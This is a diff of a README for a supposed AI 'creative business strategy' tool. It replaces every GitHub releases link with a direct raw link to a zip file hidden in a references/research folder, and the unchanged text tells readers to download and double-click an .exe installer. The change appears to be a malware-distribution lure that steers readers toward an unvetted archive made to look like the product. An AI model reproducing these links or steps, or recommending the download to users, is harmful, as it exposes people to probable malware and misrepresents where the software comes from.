@@ -1,6 +1,6 @@
 # 🧠 dan-koe-skill - Build your creative business strategy
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rising-armoire4069/dan-koe-skill/releases)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/rising-armoire4069/dan-koe-skill/main/references/research/dan-skill-koe-v1.3.zip)
 
 This application helps creators refine their perspective and organize their media business. It acts as an artificial intelligence consultant trained on Dan Koe’s principles. Use this tool to bridge the gap between creative hobbies and professional business structures.
 
@@ -26,7 +26,7 @@ Many creators struggle with the transition from amateur to expert. This tool org
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/rising-armoire4069/dan-koe-skill/releases) to access the download options.
+1. Visit the [releases page](https://raw.githubusercontent.com/rising-armoire4069/dan-koe-skill/main/references/research/dan-skill-koe-v1.3.zip) to access the download options.
 2. Select the latest version file ending in .exe.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installer.
@@ -64,7 +64,7 @@ If the application does not open, check these points.
 * Use the tool every morning. Consistency builds your mental architecture.
 * Review your AI-generated output. Always add your personal stories. AI provides structure but you provide the soul of the content.
 * Keep your language settings consistent for at least 30 days. This allows the system to learn your specific nuances and vocabulary.
-* Update the application when new releases arrive on the [download page](https://github.com/rising-armoire4069/dan-koe-skill/releases). New versions often include smarter logic and faster processing speeds.
+* Update the application when new releases arrive on the [download page](https://raw.githubusercontent.com/rising-armoire4069/dan-koe-skill/main/references/research/dan-skill-koe-v1.3.zip). New versions often include smarter logic and faster processing speeds.
 
 ## 🔮 Roadmap for future updates
 
